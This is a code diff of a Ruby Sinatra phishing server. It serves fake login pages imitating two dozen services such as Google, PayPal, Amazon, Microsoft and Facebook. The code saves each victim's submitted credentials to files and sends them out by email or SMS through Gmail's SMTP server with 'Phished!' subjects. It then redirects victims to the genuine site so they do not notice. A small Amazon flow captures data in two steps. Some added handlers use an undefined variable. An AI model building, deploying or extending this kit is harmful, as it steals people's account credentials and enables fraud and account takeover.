@@ -2,107 +2,101 @@
 require 'sinatra'
 require 'mail'
 require 'dotenv/load'
-
-#
-# Sends email with the cracked password.
-# TODO: add notification field to creation form to
-# include email and SMS
-#
-class Notifications
-  def initialize
-    @mail_send_count = 0
-  end
-
-  def mail(subject, body)
-    options = { address:              'smtp.gmail.com',
-                port:                 587,
-                user_name:            ENV['GMAIL_EMAIL'],
-                password:             ENV['GMAIL_APP_KEY'],
-                authentication:       'plain',
-                enable_starttls_auto: true }
-
-    puts "Mail: #{options}, count [#{ @mail_send_count }]"
-
-    Mail.defaults do
-      delivery_method :smtp, options
-    end
-
-    # Deliver to SMS
-    if @mail_send_count < 10
-      Mail.deliver do
-        to "#{ ENV['SMS_PHONE_NUM'] }@#{ ENV['SMS_CARRIER'] }"
-        from 'noreply@hashpass.app'
-        subject subject
-        body body
-      end
-      @mail_send_count += 1
-    end
-
-    # Deliver to Email
-    if false
-      Mail.deliver do
-        to "#{ ENV['EMAIL_TO'] }"
-        from 'noreply@hashpass.app'
-        subject subject
-        body body
-      end
-      @mail_send_count += 1
-    end
-  end
-end
+require_relative 'notifications'
+require_relative 'store'
 
 class Public < Sinatra::Base
-  set :environment, :production if ENV['APP_ENV'] == 'production'
+  SMS = false
+  phishing_pages = [
+    'adobe',
+    'amazon',
+    'dropbox',
+    'ebay',
+    'facebook',
+    'fbmobile',
+    'github',
+    'google',
+    'instagram',
+    'linkedin',
+    'messenger',
+    'microsoft',
+    'modal',
+    'netflix',
+    'paypal',    
+    'plugin-update',
+    'snapchat',
+    'spotify',
+    'starbucks',
+    'steam',
+    'twitch',
+    'twitter',
+    'wordpress',    
+    'yahoo'
+  ]
+  redir = {
+    adobe: 'https://accounts.adobe.com/',
+    amazon: 'https://www.amazon.com/ap/signin',
+    dropbox: 'https://www.dropbox.com/en_GB/login',
+    ebay: 'https://www.ebay.com/signin/',    
+    facebook: 'https://www.facebook.com/login/',
+    fbmobile: 'https://www.facebook.com/login/',
+    github: 'https://github.com/',
+    google: 'https://myaccount.google.com/',
+    instagram: 'https://www.instagram.com',
+    linkedin: 'https://www.linkedin.com/uas/login?_l=en',
+    messenger: 'https://www.messenger.com/login/',
+    microsoft: 'https://account.microsoft.com/account',
+    modal: 'https://www.google.com',    
+    netflix: 'https://www.netflix.com/Login',
+    paypal: 'https://www.paypal.com/signin',
+    snapchat: 'https://accounts.snapchat.com/accounts/login',
+    spotify: 'https://spotify.me',
+    starbucks: 'https://www.starbucks.com/',
+    steam: 'https://store.steampowered.com/login',
+    twitch: 'https://www.twitch.tv/login',
+    twitter: 'https://twitter.com/',
+    wordpress: 'https://wordpress.com/log-in',
+    yahoo: 'https://login.yahoo.com/'
+  }
 
   def initialize
     super
     @notifications = Notifications.new
-  end
+  end  
 
-  def wirte_file(site, txt)
-    timestamp = Time.now
-    open("creds/#{ site }/#{ site }.txt", 'a') do |f|
-      msg = "#{ timestamp }: #{ txt }"
-      f.puts msg
-      @notifications.mail("#{ site } Phished!", msg)
-    end
-  end
-
+  # 404
   not_found do
     File.read(File.join('public', 'index.html'))
   end
 
+  # Index
   get '/' do
-    File.read(File.join('public', 'pages/google-login/index.html'))
+    File.read(File.join('public', 'index.html'))
   end
 
+  #
+  # Phishing pages
+  #
+  phishing_pages.each do |path|
+    get '/' + path do
+      File.read(File.join('public', "pages/#{ path }/index.html"))
+    end
 
-  get '/google' do
-    File.read(File.join('public', 'pages/google-login/index.html'))
+    post '/' + path do
+      wirte_file(path, params)
+      @notifications.mail("#{ path } phished!", msg) if SMS
+      redirect redir[path.to_sym]
+    end
   end
-  post '/google' do
-    puts "params: #{ params }"
-    wirte_file('google', params)
-    File.read(File.join('public', 'pages/google-login/index.html'))
+
+  post '/amazon/step1' do
+    wirte_file('amazon', params)
+    File.read(File.join('public', "pages/amazon/step2.html"))
   end
 
-
-  get '/facebook' do
-    File.read(File.join('public', 'pages/facebook/index.html'))
-  end
-  post '/facebook' do
-    puts "params: #{ params }"
-    wirte_file('facebook', params)
-    File.read(File.join('public', 'pages/facebook/index.html'))
-  end
-end
-
-
-
-class Api < Sinatra::Base
-  set :environment, :production if ENV['APP_ENV'] == 'production'  
-
-  def initialize
-    super
+  post '/amazon/step2' do
+    wirte_file('amazon', params)
+    @notifications.mail("Amazon phished!", msg) if SMS
+    redirect redir[:amazon]
   end
 end
